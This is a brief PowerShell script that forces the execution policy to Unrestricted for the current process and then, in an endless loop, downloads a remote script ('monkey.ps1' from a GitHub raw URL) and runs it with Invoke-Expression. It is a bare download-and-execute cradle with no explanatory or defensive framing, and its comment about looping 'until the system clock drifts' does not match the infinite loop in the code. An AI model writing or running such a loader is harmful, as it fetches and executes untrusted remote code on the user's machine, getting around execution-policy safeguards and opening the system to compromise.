# Set the execution policy to Unrestricted for the current process scope
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force
# Loop until the system clock drifts
while($true) {
    # Invoke the script from the URL
    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jelpsIT/duckery/main/monkey.ps1')
}
